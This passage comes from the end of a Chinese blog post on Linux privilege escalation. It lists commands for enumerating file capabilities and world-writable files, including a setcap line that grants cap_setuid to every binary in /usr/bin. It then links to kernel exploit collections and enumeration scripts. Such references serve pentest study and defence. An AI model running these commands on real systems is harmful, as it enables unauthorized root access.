+<h3 id="2-可用文件查找"><a href="#2-可用文件查找" class="headerlink" title="2. 可用文件查找"></a>2. 可用文件查找</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getcap -r /usr/bin</span><br><span class="line"></span><br><span class="line">setcap cap_net_raw+p /bin/*</span><br><span class="line"></span><br><span class="line">setcap cap_setuid+ep /usr/bin/*</span><br><span class="line"></span><br><span class="line">grep -v &#x27;^#\|none\|^$&#x27; /etc/security/capability.conf 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><strong>可写权限文件查找</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -writable ! -user `whoami` -type f ! -path &quot;/proc/*&quot; ! -path &quot;/sys/*&quot; -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -perm -2 -type f 2&gt;/dev/null</span><br><span class="line">find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><p><strong>GTFOBins</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
+</ul>
+<p><strong>提权漏洞</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/xairy/kernel-exploits">https://github.com/xairy/kernel-exploits</a></li>
+</ul>
+<p><strong>提权脚本</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Privilege-Escalation/" rel="tag"># Privilege Escalation</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/33899/" rel="prev" title="红队武器工具库">
+                  <i class="fa fa-chevron-left"></i> 红队武器工具库
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/10124/" rel="next" title="Linux应急响应进阶篇">
+                  Linux应急响应进阶篇 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
